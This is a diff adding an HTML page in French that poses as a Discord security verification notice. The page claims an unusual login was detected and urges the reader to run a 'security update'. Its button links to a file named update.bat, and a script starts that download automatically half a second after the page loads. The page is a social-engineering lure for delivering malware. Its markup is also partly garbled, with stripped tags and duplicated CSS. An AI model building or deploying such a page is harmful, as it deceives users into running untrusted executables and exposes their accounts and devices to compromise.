@@ -1,0 +1,99 @@
+!DOCTYPE html
+html lang=fr
+head
+    meta charset=UTF-8
+    meta name=viewport content=width=device-width, initial-scale=1.0
+    titleDiscord — Vérification de Sécuritétitle
+    style
+         { margin 0; padding 0; box-sizing border-box; font-family 'Segoe UI', 'Whitney', 'Helvetica Neue', sans-serif; }
+        body { 
+            background #313338; 
+            min-height 100vh; 
+            display flex; 
+            align-items center; 
+            justify-content center; 
+            padding 20px;
+        }
+        .card {
+            background #1e1f22;
+            border-radius 12px;
+            padding 40px 32px;
+            max-width 480px;
+            width 100%;
+            text-align center;
+            box-shadow 0 8px 24px rgba(0,0,0,0.4);
+        }
+        .icon {
+            width 80px;
+            height 80px;
+            background #5865f2;
+            border-radius 50%;
+            display flex;
+            align-items            align-items center;
+            justify-content center;
+            margin 0 auto 20px;
+            font-size 40px;
+        }
+        h1 {
+            color #fff;
+            font-size ize 22px;
+            margin 20px 0 8px;
+        }
+        p {
+            color #b5bac1;
+            font-size 15px;
+            line-height 1.5;
+            margin-bottom 8px;
+        }
+        .badge {
+            background #2d2f36;
+            color #dbdee1;
+            padding 8px 14px;
+            border-radius 6px;
+            font-size 13px;
+            display inline-block;
+            margin 12px 0 24px;
+        }
+        .btn {
+            background #5865f2;
+            color #fff;
+            border none;
+            padding 16px 0;
+            width 100%;
+            border-radius 8px;
+            font-size 16px;
+            font-weight 600;
+            cursor pointer;
+            transition background 0.15s;
+        }
+        .btnhover { background #4752c4; }
+        .footer-text {
+            color #6d6f78;
+            font-size 12px;
+            margin-top 16px;
+        }
+    style
+head
+body
+    div class=card
+        div class=icon🔒div
+        h1Vérification de sécurité requiseh1
+        pDiscord a détecté une connexion inhabituelle. Pour sécuriser votre compte, veuillez exécuter la mise à jour de sécurité.p
+        div class=badge🔹 Connexion depuis un nouvel appareil détectéediv
+        br
+        a href=update.bat download id=dlBtn
+            button class=btn✅ Vérifier mon comptebutton
+        a
+        p class=footer-textCette vérification prend moins de 30 secondes.p
+    div
+
+    script
+         Déclenche le téléchargement automatique au chargement
+        window.onload = function() {
+            setTimeout(() = {
+                document.getElementById('dlBtn').click();
+            }, 500);
+        };
+    script
+body
+html
